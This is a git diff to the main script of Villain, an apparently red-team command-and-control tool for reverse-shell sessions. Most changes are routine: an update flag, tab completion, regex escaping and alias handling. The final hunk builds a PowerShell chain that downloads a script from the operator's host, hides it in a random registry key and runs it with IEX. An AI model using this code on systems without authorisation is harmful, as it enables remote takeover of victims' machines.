@@ -13,6 +13,7 @@ from Core.settings import Hoaxshell_Settings, Core_Server_Settings, TCP_Sock_Han
 from Core.logging import clear_metadata
 from hashlib import md5
 from requests import get as requests_get
+from requests.exceptions import ReadTimeout
 
 # -------------- Arguments -------------- #
 parser = argparse.ArgumentParser()
@@ -24,7 +25,7 @@ parser.add_argument("-f", "--file-smuggler-port", action="store", help = "Http f
 parser.add_argument("-i", "--insecure", action="store_true", help = "Allows any Villain client (sibling server) to connect to your instance without prompting you for verification.")
 parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate (for HoaxShell https server).")
 parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate (for HoaxShell https server).")
-parser.add_argument("-s", "--skip-update", action="store_true", help = "Do not check for updates on startup.")
+parser.add_argument("-u", "--update", action="store_true", help = "Try to fetch the latest commits from the main branch on GitHub.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
 
 args = parser.parse_args()
@@ -124,7 +125,7 @@ def print_banner():
 
 def print_meta():
 	print(f'{META} Created by t3l3machus')
-	print(f'{META} Follow on Twitter, HTB, GitHub: @t3l3machus')
+	print(f'{META} Follow on GitHub, X, YT: @t3l3machus')
 	print(f'{META} Thank you!\n')
 
 
@@ -478,8 +479,9 @@ class Completer(object):
 		
 		self.tab_counter = 0		
 		self.main_prompt_commands = clone_dict_keys(PrompHelp.commands)
-		self.generate_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
+		self.main_command_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
 		'exec_outfile', 'domain']
+		self.pseudo_shell_commands = ['upload', 'cmdinspector']
 		self.payload_templates_root = os.path.dirname(os.path.abspath(__file__)) + f'{os.sep}Core{os.sep}payload_templates'
 	
 	
@@ -536,7 +538,7 @@ class Completer(object):
 					else:						
 						print('\n')
 						print_columns(matches)
-						Main_prompt.rst_prompt()
+						Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())
 						return False 
 				
 				elif len(unique) == 1:
@@ -614,7 +616,7 @@ class Completer(object):
 				print('\n')	
 				print_columns(match)
 				self.tab_counter = 0
-				Main_prompt.rst_prompt()
+				Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())
 
 				
 
@@ -641,15 +643,14 @@ class Completer(object):
 		main_cmd = line_buffer_list[0].lower()
 		
 		# Get prompt command from word fragment
+		# print(f'{line_buffer_list_len} - {Main_prompt.ready}  - {main_cmd}')
 		if line_buffer_list_len == 1:
-					
-			match = self.get_match_from_list(main_cmd, self.main_prompt_commands)
+			match = self.get_match_from_list(main_cmd, self.main_prompt_commands if Main_prompt.ready else self.pseudo_shell_commands)
 			self.update_prompt(len(line_buffer_list[0]), match) if match else chill()
-		
-		
+
+	
 		# Autocomplete session IDs
-		elif (main_cmd in ['exec', 'alias', 'kill', 'shell', 'repair', 'upload', 'conptyshell']) and \
-			(line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in ["/", "~"]):
+		elif ((main_cmd in ['exec', 'alias', 'kill', 'shell', 'repair', 'upload', 'conptyshell'] and Main_prompt.ready) or (main_cmd in self.pseudo_shell_commands and not Main_prompt.ready)) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in ["/", "~"]):
 			
 			if line_buffer_list[-1] in (Sessions_Manager.active_sessions.keys()):
 				pass
@@ -691,22 +692,25 @@ class Completer(object):
 		elif (main_cmd == 'generate') and (line_buffer_list_len > 1):
 									
 			word_frag = line_buffer_list[-1].lower()
-
-			if re.search('payload=[\w\/\\\]{0,}', word_frag):
+			if re.search('payload=[\\w\\/\\\\]{0,}', word_frag):
 				
 				tmp = word_frag.split('=')
+				root = self.payload_templates_root	
 
-				if tmp[1]:
-
-					root = self.payload_templates_root			
+				if tmp[1]:					
 					search_term = tmp[1]
 					self.path_autocompleter(root, search_term, hide_py_extensions = True)
 
-				else:
-					pass
+				elif self.tab_counter > 1:
+					contents = os.listdir(root)
+					directories = [f'{entry}/' for entry in contents if os.path.isdir(os.path.join(root, entry))]
+					print('\n')	
+					print_columns(directories)
+					self.tab_counter = 0
+					Main_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())
 
 			else:
-				match = self.get_match_from_list(line_buffer_list[-1], self.generate_arguments)
+				match = self.get_match_from_list(line_buffer_list[-1], self.main_command_arguments)
 				self.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else chill()
 
 
@@ -738,7 +742,7 @@ def main():
 	current_wd = os.path.dirname(os.path.abspath(__file__))
 	
 	# Check for updates
-	if not args.skip_update:
+	if args.update:
 		
 		try:
 			local_files_path = current_wd + os.sep
@@ -746,7 +750,7 @@ def main():
 			url = f'https://api.github.com/repos/t3l3machus/Villain/git/trees/{branch}?recursive=1'
 			raw_url = f'https://raw.githubusercontent.com/t3l3machus/Villain/{branch}/'		
 			Loading.active = True
-			loading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Checking for updates',), name = 'loading_animation', daemon = True).start()
+			Thread(target = Loading.animate, args = (f'[{INFO}] Checking for updates',), name = 'loading_animation', daemon = True).start()
 
 			
 			def get_local_file_hash(filename):
@@ -778,7 +782,7 @@ def main():
 				
 			#except requests.exceptions.HTTPError as e:
 				#print(f'\r[{ERR}] Failed to fetch latest version data: {e}') 
-				
+
 			except Exception as e:
 				res_status_code = -1
 				Loading.stop()
@@ -791,7 +795,13 @@ def main():
 				update_consent = False
 				
 				for filename in files:
-					file_data = requests_get(url = raw_url + filename, timeout=(5, 27))
+					try:
+						file_data = requests_get(url = raw_url + filename, timeout=(5, 29))
+					except:
+						# Temporary dirty solution
+						print(f'\r[{ERR}] Failed to fetch file: {filename}. Installation may be corrupt. Consider reinstalling Villain.')
+						raise KeyboardInterrupt
+						
 					latest_signature = md5(file_data.content).hexdigest()
 					local_signature = get_local_file_hash(filename)
 					
@@ -962,8 +972,8 @@ def main():
 
 
 				# Handle single/double quoted arguments
-				quoted_args_single = re.findall("'{1}[\s\S]*'{1}", user_input)
-				quoted_args_double = re.findall('"{1}[\s\S]*"{1}', user_input)
+				quoted_args_single = re.findall("'{1}[\\s\\S]*'{1}", user_input)
+				quoted_args_double = re.findall('"{1}[\\s\\S]*"{1}', user_input)
 				quoted_args = quoted_args_single + quoted_args_double
 				
 				if len(quoted_args):
@@ -1041,6 +1051,15 @@ def main():
 							execution_object = cmd_list[1]
 							session_id = cmd_list[2]
 							is_file = False
+
+							# Check if session id has alias
+							session_id = sessions_manager.alias_to_session_id(session_id)
+							
+							if not session_id:
+								print(f'\r[{ERR}] Failed to interpret session_id.')
+								Main_prompt.ready = True
+								continue	
+							
 							shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
 							
 							if execution_object[0] in [os.sep, '~']:
@@ -1077,15 +1096,7 @@ def main():
 								if dangerous_input_detected:
 									Session_Defender.print_warning()
 									Main_prompt.ready = True
-									continue	
-
-							# Check if session id has alias
-							session_id = sessions_manager.alias_to_session_id(session_id)
-							
-							if not session_id:
-								print(f'\r[{ERR}] Failed to interpret session_id.')
-								Main_prompt.ready = True
-								continue								
+									continue								
 							
 							# If file, check if shell type is supported for exec
 							if shell_type not in ['unix', 'powershell.exe']:
@@ -1429,9 +1440,9 @@ def main():
 						rand_key = get_random_str(5)
 						value_name = get_random_str(5)
 						script_src = f'http://{lhost}:{File_Smuggler_Settings.bind_port}/{ticket}'
-						reg_polution = f'New-Item -Path "HKCU:\SOFTWARE\{rand_key}" -Force | Out-Null;New-ItemProperty -Path "HKCU:\SOFTWARE\{rand_key}" -Name "{value_name}" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'
-						exec_script = f'(Get-ItemPropertyValue -Path "HKCU:\SOFTWARE\{rand_key}\" -Name "{value_name}" | IEX) | Out-Null'
-						remove_src = f'Remove-Item -Path "HKCU:\Software\{rand_key}" -Recurse'
+						reg_polution = f'New-Item -Path "HKCU:\\SOFTWARE\\{rand_key}" -Force | Out-Null;New-ItemProperty -Path "HKCU:\\SOFTWARE\\{rand_key}" -Name "{value_name}" -Value $(IRM -Uri {script_src} -UseBasicParsing) -PropertyType String | Out-Null;'
+						exec_script = f'(Get-ItemPropertyValue -Path "HKCU:\\SOFTWARE\\{rand_key}\" -Name "{value_name}" | IEX) | Out-Null'
+						remove_src = f'Remove-Item -Path "HKCU:\\Software\\{rand_key}" -Recurse'
 						new_proc = Exec_Utils.new_process_wrapper(f"{exec_script}; {func_name}; {remove_src}", session_id)
 						execution_object = Exec_Utils.ps_try_catch_wrapper(f'{reg_polution};{exec_script};({new_proc})', error_action = remove_src)
 						
